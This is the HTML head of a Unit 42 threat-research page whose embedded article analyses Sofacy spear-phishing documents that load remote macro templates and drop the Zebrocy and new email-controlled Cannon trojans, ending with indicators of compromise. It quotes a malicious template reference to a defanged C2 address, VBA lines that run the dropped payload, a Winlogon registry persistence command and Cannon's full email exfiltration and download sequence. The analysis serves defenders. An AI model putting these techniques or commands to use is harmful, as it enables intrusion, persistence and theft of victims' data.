
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan" />
<meta property="og:description" content="Unit 42&#039;s continued look into Sofacy reveals global attacks and wheels out new &#039;Cannon&#039; trojan." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Cannon" />
<meta property="article:tag" content="Sofacy" />
<meta property="article:tag" content="Zebrocy" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2018-11-20T04:00:30+00:00" />
<meta property="article:modified_time" content="2018-12-11T14:41:31+00:00" />
<meta property="og:updated_time" content="2018-12-11T14:41:31+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg" />
<meta property="og:image:width" content="600" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42&#039;s continued look into Sofacy reveals global attacks and wheels out new &#039;Cannon&#039; trojan." />
<meta name="twitter:title" content="Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/feed/" />
<meta property="og:likes" content="4"/>
<meta property="og:readtime" content="13"/>
<meta property="og:views" content="27,308"/>
<meta property="og:date_created" content="November 20, 2018 at 6:00 AM"/>
<meta property="og:post_length" content="3920"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:author" content="Bryan Lee"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/bryanlee/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Sofacy Continues Global Attacks and Wheels Out New \u2018Cannon\u2019 Trojan","name":"Sofacy Continues Global Attacks and Wheels Out New \u2018Cannon\u2019 Trojan","description":"Unit 42's continued look into Sofacy reveals global attacks and wheels out new 'Cannon' trojan.","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan\/","datePublished":"November 20, 2018","articleBody":"In late October and early November 2018, Unit 42 intercepted a series of weaponized documents that use a technique to load remote templates containing a malicious macro. These types of weaponized documents are not uncommon but are more difficult to identify as malicious by automated analysis systems due to their modular nature. Specific to this technique, if the C2 server is not available at the time of execution, the malicious code cannot be retrieved, rendering the delivery document largely benign.\n\nThe weaponized documents targeted several government entities around the globe, including North America, Europe, and a former USSR state. Fortunately for us, the C2 servers for several of these documents were still operational allowing for retrieval of the malicious macro and the subsequent payloads. Analysis revealed a consistent first-stage payload of the well-documented Zebrocy Trojan. Additional collection of related documents revealed a second first-stage payload that we have named \u2018Cannon\u2019. Cannon has not been previously observed in use by the Sofacy group and contains a novel email-based C2 communication channel. Email as a C2 channel is not a new tactic, but it is generally not observed in the wild as often as HTTP or HTTPS. Using email as a C2 channel may also decrease the chance of detection, as sending email via non-sanctioned email providers may not necessarily construe suspicious or even malicious activity in many enterprises.\n\nThe activity discussed in this blog revolves around two of the multitude of weaponized documents that we collected. These two documents shared multiple data artifacts, such as a shared C2 IP, shared author name, and shared tactics. Details of the extended attack campaign associated with the Cannon Trojan will be discussed in a later blog. A particularly interesting aspect of one of the two documents we analyzed was the filename used, crash list(Lion Air Boeing 737).docx. This is not the first instance of an adversary group using recent current events as a lure, but it is interesting to see this group attempt to capitalize on the attention of a catastrophic event to execute their attack.\n\n&nbsp;\n\nAttack Details\n\nThe initial sample we intercepted was a Microsoft Word document (SHA256: 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f) with the filename crash list(Lion Air Boeing 737).docx using the author name Joohn. This document appeared to be targeting a government organization dealing with foreign affairs in Europe via spear-phishing. Once the user attempts to open the document, Microsoft Word immediately attempts to load the remote template containing a malicious macro and payload from the location specified within the settings.xml.rels file of the DOCX document, as seen here:\n&lt;Relationship Id=\"rId1\" Type=\"http:\/\/schemas.openxmlformats.org\/officeDocument\/2006\/relationships\/attachedTemplate\" Target=\"hxxp:\/\/188.241.58[.]170\/live\/owa\/office.dotm\" TargetMode=\"External\"\/&gt;\nIf the C2 has already been taken offline the document will still open, but Word will be unable to retrieve the remote template and thus Word will not load a macro. In this situation, Word will present the same lure document to the victim as seen in Figure 2, but without the ability to enable macros via an Enable Content button. Assuming the C2 is still operational however, Word loads the remote template (SHA256: f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5) and the user is presented with the screen as seen in Figure 1.\n\n\nFigure 1 Lure screen\n&nbsp;\n\nOnce the victim presses the Enable content button, the embedded macro is executed. The macros used for these delivery documents use a less common method of using the AutoClose function. This is a form of anti-analysis as Word will not fully execute the malicious code until the user closes the document. If an automated sandbox exits its analysis session without specifically closing out the document, the sandbox may miss the malicious activity entirely. Once successfully executed, the macro will install a payload and save a document to the system. Typically, we expect to see a decoy document saved to the system and later displayed to make the victim less suspicious of malicious activity; however, in this case the document saved to the system was never displayed and does not contain any pertinent content to the Lion Air tragedy theme seen in the filename. The macro obtains the document saved to the system from within the document stored as UserForm1.Label1.Caption and will write it to:\n\n%TEMP%\\~temp.docm\n\nThe macro obtains the payload saved to the system from within the document stored as UserForm1.Label2.Caption and will write it to:\n\n%APPDATA%\\MSDN\\~msdn.exe\n\nThe macro executes this payload in a rather interesting way by loading the dropped ~temp.docm document and calling a function within its embedded macro to run the payload. We believe the creator of this delivery document chose to run the payload from the dropped file as an evasion technique. Also, the fact the initial macro uses this dropped document for the execution of the payload may also explain why the document did not contain any decoy contents.\n\nTo carry out this functionality, after writing the \u00a0~temp.docm and ~msdn.exe files to the system, the initial macro will load the ~temp.docm file as a Word Document object and attempts to run the function Proc1 in the Module1 macro within the ~temp.docm file, as seen in the following code snippet:\nSet WA = CreateObject(\"Word.Application\")\nWA.Visible = False\nSet oMyDoc = WA.Documents.Open(vF)\nWA.Application.Run \"Module1.Proc1\"\n\nThe Proc1 function within the Module1 does nothing more than build the %APPDATA%\\MSDN\\~msdn.exe path to the dropped payload and executes it using the built-in Shell function, as seen in the following code snippet:\nvAdd = \"~msdn\"\nvFileName = Environ(\"APPDATA\") &amp; \"\\MSDN\\\" \nvFileName = vFileName + vAdd &amp; \".e\" + \"x\" &amp; \"e\"\nShell vFileName \n\nThe payload dropped to the system (SHA256: 6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a) is a UPX packed Zebrocy variant written in the Delphi language. This variant of Zebrocy is functionally very similar to the Delphi-based payloads discussed in our previous publication on Sofacy attacks using Zebrocy earlier this year. The developer of this particular payload configured it to use the following URL to communicate with as its C2:\n\nhxxp:\/\/188.241.58[.]170\/local\/s3\/filters.php\n\nThe Zebrocy Trojan gathers system specific information that it will send to the C2 server via an HTTP POST request to the above URL. Like other Zebrocy samples, this Trojan collects system specific information it will send to the C2 server by running the command SYSTEMINFO &amp; TASKLIST on the command line and by enumerating information about connected storage devices. This specific variant of Zebrocy will also send a screenshot of the victim host as a JPEG image to the C2 server. The C2 server will then provide a secondary payload to the beacon in ASCII hexadecimal representation, which the Trojan will decode and write to the following location:\n\n%APPDATA%\\Roaming\\Audio\\soundfix.exe\n\nDuring our analysis, the C2 server provided a secondary payload that functionally appeared similar to the initial Zebrocy sample. The secondary payload was also written in Delphi and its developer configured it to communicate with its C2 server using HTTPS via the following URL:\n\nhxxps:\/\/200.122.181[.]25\/catalog\/products\/books.php\n\n&nbsp;\n\nNew Cannon Trojan\n\nWe were able to collect a second delivery document that shared the Joohn author from the crash list(Lion Air Boeing 737).docx document, as well as the 188.241.58[.]170\u00a0C2 IP to host its remote template. Structurally this sample was very similar to the initially analyzed document, but the payload turned out to be a completely new tool which we have named Cannon.\n\nThe tool is written in C# whose malicious code exists in a namespace called cannon, which is the basis of the Trojan\u2019s name. The Trojan functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. The specific functions of Cannon can be seen in Table 1. This tool also has a heavy reliance on EventHandlers with timers to run its methods in a specific order and potentially increase its evasion capability.\n\n\n\nFunction\nDescription\nTimer (seconds)\n\n\nstart_Tick\nAdds persistence and generates unique system specific identifier\n1\n\n\ninf_Tick\nGathers system information\n300\n\n\nscreen_Tick\nTakes a screenshot of the desktop\n10\n\n\ntxt_Tick\nLogs into primary POP3 account and gets secondary POP3 account\n120\n\n\nload_Tick\nLogs into secondary POP3 account to download attachment to email\n120\n\n\nsubject_Tick\nLogs into primary POP3 account to get path to for the downloaded attachment\n120\n\n\nrun_Tick\nMoves the downloaded attachment to path and creates a process with attachment\n60\n\n\n\nTable 1 Functions executed by Cannon and their purpose\nThe overall purpose of Cannon is to use several email accounts to send system data (system information and screenshot) to the threat actors and to ultimately obtain a payload from an email from the actors. The image in Figure 2, in addition to the following step-by-step process illustrates how Cannon communicates with the actor-controlled C2 email address to obtain a secondary payload:\nFigure 2 C2 process flow for Cannon\n&nbsp;\n\n \tCannon gathers system information and saves it to a file named ini. The Trojan sends an email to sahro.bella7[at]post.cz with i.ini as the attachment, S_inf within the body and a subject with a unique system identifier via SMTPS from one of the following accounts:\n\n \tBishtr.cam47\n \tLobrek.chizh\n \tCervot.woprov\n\n\n\n\n \tCannon takes a screenshot and saves it to a file named ops. The Trojan sends an email to sahro.bella7[at]post.cz with sysscr.ops as the attachment, the string SCreen within the body and a subject with the unique system identifier via SMTPS from one of three previously used accounts.\n \tThe actors likely log into sahro.bella7[at]post.cz and process the system information and screenshot sent by the Trojan to determine if the compromised host is of interest. If the actor wishes to download an additional payload to the compromised host, they will respond by sending emails in the following steps.\n \tThe actor sends an email to trala.cosh2[at]post.cz with the unique system identifier as a subject with a secondary email account and credentials in ASCII hexadecimal format within the message body. This secondary email account is unknown at this time, so we will refer to it as \"secondary email account\" in future steps.\n \tThe actor sends an email to the secondary email account with the unique system identifier as a subject with a secondary payload attached with a filename of txt.\n \tCannon logs into the\u00a0trala.cosh2[at]post.cz account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and decodes the hexadecimal data in the body of the message to obtain the secondary email account.\n \tCannon acknowledges the receipt of the secondary email address by sending an email to\u00a0sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.\n \tThe actor sends an email to\u00a0trala.cosh2[at]post.cz with the unique system identifier as a subject with a file path that the Cannon Trojan will use to save the secondary payload.\n \tCannon logs into the secondary email account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and saves the attachment named auddevc.txt.\n \tCannon acknowledges the receipt of file download by sending an email to\u00a0sahro.bella7[at]post.cz with l.txt (contains 090 string) as the attachment, ok2 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.\n \tCannon logs into the\u00a0trala.cosh2[at]post.cz\u00a0account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and decodes the hexadecimal data in the body of the message to obtain the file path that it will use to move the downloaded auddevc.txt file.\n \tCannon acknowledges the receipt of file path by sending an email to\u00a0sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok3 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.\n \tCannon moves the downloaded file to the specified path.\n \tCannon acknowledges the successful move by sending an email to\u00a0sahro.bella7[at]post.cz with l.txt (contains 090 string) as the attachment, ok4 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.\n \tCannon runs the downloaded file from the specified path.\n \tCannon acknowledges the successful execution by sending an email to\u00a0sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok5 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.\n\nFor a complete analysis of Cannon, please refer to the Appendix.\n\n&nbsp;\n\nConclusion\n\nThe Sofacy threat group continues to target government organizations in the EU, US, and former Soviet states to deliver the Zebrocy tool as a payload. In these attacks, the delivery documents used to install Zebrocy used remote templates, which increases the difficulty to analyze the attack as an active C2 server is needed to obtain the macro-enabled document. The Sofacy group also leveraged the recent Lion Air disaster as a lure in one of these attacks, which continues to show a willingness to use current events in their social engineering themes.\n\nOf note, we also discovered the Sofacy group using a very similar delivery document to deliver a new Trojan called Cannon. Cannon uses SMTPS and POP3S as its C2 channel compared to Zebrocy that uses a more commonly observed HTTP or HTTPS based C2. This is not a new tactic but may be more effective at evading detection as the external hosts involved are a legitimate email service provider. Add the layer of encryption that the SMTPS and POP3S protocols provide to the legitimate web-based service and you have a very difficult C2 channel to block\n\nWhile\u00a0Sofacy\u2019s campaign delivering Zebrocy and Cannon\u00a0remains active, Palo Alto Networks customers are protected from this threat in the following ways:\n\n \tAutoFocuscustomers can track these samples with the\u00a0Zebrocy\u00a0and Cannon\n \tWildFiredetects the delivery documents, Zebrocy and Cannon payloads discussed in this blog with malicious verdicts.\n \tTraps blocks the macro-ladened remote templates as Suspicious macro detected,\u00a0as well as Zebrocy and Cannon payloads as Suspicious executable detected.\n \tThe IP addresses hosting remote templates and C2 services in these attacks are classified as Command and Control.\n\nIndicators of Compromise\n\nDelivery Hashes\n\n2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f\naf77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392\n\nRemote Template Hashes\n\nf1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5\nfc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557d\n\n\nRemote Templates\n\nhxxp:\/\/188.241.58[.]170\/live\/owa\/office.dotm\n\n\nZebrocy Hashes\n\n6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a\n\n\nZebrocy C2 URLs\n\nhxxp:\/\/188.241.58[.]170\/local\/s3\/filters.php\n\nhxxps:\/\/200.122.181[.]25\/catalog\/products\/books.php\n\n\nCannon Hashes\n\n61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221e\n\n\nCannon Email Accounts\nsahro.bella7[at]post.cz\ntrala.cosh2[at]post.cz\nbishtr.cam47[at]post.cz\nlobrek.chizh[at]post.cz\ncervot.woprov[at]post.cz\nAppendix\nThe Cannon Trojan is written in C# and functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. This tool uses a variety of functions that are run in a specific order to:\n\n \tGather system information and a screenshot\n \tSend the gathered information to the actor via an email\n \tCheck inbox for email from actor with payload attached\n \tDownload payload attached to email\n \tExecute downloaded payload\n\nThe functions called to carry out these activities are as follows:\n\nstart_Tick\n\nThis function starts off by writing the string {SysPar = 65}\u00a0to a file named s.txt, which will be used during C2 communications throughout the execution of this Trojan. This function is also responsible for creating persistence by writing the following to r.bat\u00a0and executing it:\n\nREG ADD \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" \/v Shell \/t REG_SZ \/d [path to wsslc.exe]\n\nIt also creates a unique system specific identifier that it will use during the C2 communications to send and receive messages. The system specific identifier is a 16 character string that the Trojan creates using the serial number of the C volume and the first 4 hexadecimal bytes from Environment.UserName. The start_Tick function then begins the timer to run the inf_Tick method.\n\n&nbsp;\n\ninf_Tick\n\nResponsible for gathering system information, which it then saves to the i.ini file:\n\n \tApplication.ExecutablePath\n \tEnvironment.OSVersion\n \tEnvironment.SystemDirectory\n \tEnvironment.UserDomainName\n \tEnvironment.MachineName\n \tEnvironment.UserName\n \tTimeZone.CurrentTimeZone.StandardName\n \tEnvironment.TickCount\n \tDriveInfo.GetDrives() - Name,VolumeLabel,DriveFormat,DriveType,TotalSize,AvailableFreeSpace,Serial number\n \tFolders in C:\\Program Files\\\n \tFolders in C:\\Program Files (x86)\\\n \tProcess.GetProcesses\n\nIt will use the aforementioned authentication credentials to log into the SMTP server to send the i.ini file to the C2 email address. The email sent to exfiltrate this information will have i.ini attached to it with the unique system identifier as the subject and S_inf within the body of the email message. The inf_Tick function then begins the timer to run the screen_Tick\u00a0method.\n\n&nbsp;\n\nscreen_Tick\n\nTakes a screenshot of the desktop and saves it to a file named sysscr.ops. It will use the aforementioned authentication credentials to log into the SMTP server to send the sysscr.ops file to the C2 email address. The email sent to exfiltrate this information will have sysscr.ops file attached to it with the unique system identifier as the subject and SCreen within the body of the email message. The screen_Tick function then begins the timer to run the txt_Tick\u00a0method.\n\n&nbsp;\n\ntxt_Tick\n\nThe Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name trala.cosh2[at]post.cz. If successful, the Trojan will access the messages in the inbox, specifically looking for any emails that have a subject that matches the unique system identifier. If an email exists, the Trojan will treat the email's body as hexadecimal format and save it to a variable that will be used by the load_Tick\u00a0function. The Trojan will delete the email after reading and processing these emails.\n\nIf the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and the string\u00a0ok within the body of the email message. The txt_Tick function then begins the timer to run the load_Tick\u00a0method.\n\n&nbsp;\n\nload_Tick\n\nThe Trojan will first remove all occurrences of B&amp; and Db from the text obtained from the email in the txt_Tick function. The Trojan will then split the remaining text on the % character and treat the content to the left of the % character as an account name and the content to the right as a password. The Trojan uses these credentials to log into another email account at pop.seznam[.]cz via POP3s, which it will check for email messages that have the unique system identifier as the subject. The Trojan will parse emails with the correct subject to obtain its attachments. The Trojan will save any attachments whose names contain the string auddevc to the system, which is meant to download a file named auddevc.txt. The Trojan will also create a file named l.txt that it will write the string 090 to.\n\nIf the Trojan obtained the file from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address. The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok2 within the body of the email message. The load_Tick function then begins the timer to run the subject_Tick method.\n\n&nbsp;\n\nsubject_Tick\n\nThis function is very similar in functionality to the txt_Tick\u00a0function. Just like the txt_Tick\u00a0function, the Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name trala.cosh2@post[.]cz, again looking for subject of emails in the inbox that match the unique system identifier. The Trojan will then treat the body of the email as hexadecimal data that it will save to a variable that will be used by the run_Tick\u00a0function. The contents saved to the variable should be the path in which the actor wishes the file saved in the load_Tick\u00a0function to be moved to and run from.\n\nIf the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok3 within the body of the email message. The subject_Tick function then begins the timer to run the run_Tick\u00a0method.\n\n&nbsp;\n\nrun_Tick\n\nThe Trojan will first attempt to create the directory within the path obtained from the email in the subject_Tick\u00a0function. It then attempts to move the auddevc.txt file downloaded in the load_Tick\u00a0function to the newly created directory. If the file was successfully moved, the Trojan it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address. The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok4 within the body of the email message.\n\nThe Trojan then attempts to create a process using the newly moved downloaded file. If the Trojan was able to successfully run the download file, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok5 within the body of the email message. The Trojan would then delete the sysscr.ops screenshot file and the i.ini system information file before exiting.","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2018\/04\/unit42-blog-600x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Robert Falcone"},{"@type":"Person","name":"Bryan Lee"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"94637","token":"7e15a0f8b3","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=94637' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
